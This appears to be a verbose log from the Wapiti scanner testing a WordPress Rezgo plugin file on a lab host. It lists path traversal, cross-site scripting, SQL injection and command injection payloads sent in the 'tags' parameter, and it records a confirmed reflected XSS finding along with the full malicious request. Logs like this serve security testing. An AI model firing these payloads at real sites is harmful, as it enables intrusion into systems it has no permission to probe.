2024-03-21 21:09:55.830 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.840 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=frame_header.php (0)
2024-03-21 21:09:55.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=frame_header.php%00 (0)
2024-03-21 21:09:55.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=frame_header.php%3A%3A%24DATA (0)
2024-03-21 21:09:55.898 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 21:09:55.918 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.935 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 21:09:55.951 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.971 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3CScRiPt%3Ealert%28%27wm3x0k7qk0%27%29%3C%2FsCrIpT%3E (0)
2024-03-21 21:09:56.051 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-21 21:09:56.051 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php via injection in the parameter tags
2024-03-21 21:09:56.052 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-21 21:09:56.052 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3CScRiPt%3Ealert%28%27wm3x0k7qk0%27%29%3C%2FsCrIpT%3E HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 21:09:56.052 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-21 21:09:56.073 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 21:09:56.106 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 21:09:56.123 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:56.124 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%C2%BF%27%22%28 (0)
2024-03-21 21:09:56.146 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%20AND%2079%3D133%20AND%2049%3D49 (0)
2024-03-21 21:09:56.158 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%27%20AND%2061%3D88%20AND%20%2740%27%3D%2740 (0)
2024-03-21 21:09:56.171 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%22%20AND%2028%3D108%20AND%20%2264%22%3D%2264 (0)
2024-03-21 21:09:56.183 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%29%20AND%2021%3D91%20AND%20%2861%3D61 (0)
2024-03-21 21:09:56.195 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%27%29%20AND%2037%3D75%20AND%20%28%2731%27%3D%2731 (0)
2024-03-21 21:09:56.208 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%22%29%20AND%2014%3D43%20AND%20%28%2266%22%3D%2266 (0)
2024-03-21 21:09:56.248 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 21:09:56.266 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:56.270 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%3Benv%3B (0)
2024-03-21 21:09:56.281 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%7Cenv%7C (0)
2024-03-21 21:09:56.291 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%3Benv%3B (0)
2024-03-21 21:09:56.300 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%3Benv%3B (0)
2024-03-21 21:09:56.310 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 21:09:56.320 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%3Benv%3B (0)
2024-03-21 21:09:56.330 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%0Aenv%3B (0)
2024-03-21 21:09:56.340 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%26set%26 (0)
2024-03-21 21:09:56.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=set (0)
2024-03-21 21:09:56.359 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=env (0)
2024-03-21 21:09:56.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2Fe%00 (0)
2024-03-21 21:09:56.380 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.391 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.401 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.423 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.434 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.444 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.465 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.475 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.486 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:09:56.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:09:56.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 21:09:56.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%60%29%60 (0)
2024-03-21 21:09:56.530 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%60sleep%2060%60 (0)
2024-03-21 21:09:56.540 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%3Bsleep%2060%3B (0)
2024-03-21 21:09:56.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=a%7Csleep%2060%3B (0)
2024-03-21 21:09:56.562 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 21:09:56.607 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 21:09:56.623 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:56.710 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 21:09:56.759 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//rezgo.json/
2024-03-21 21:09:56.759 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//rezgo.json/web_03212024_2109.html with a browser to see this report.
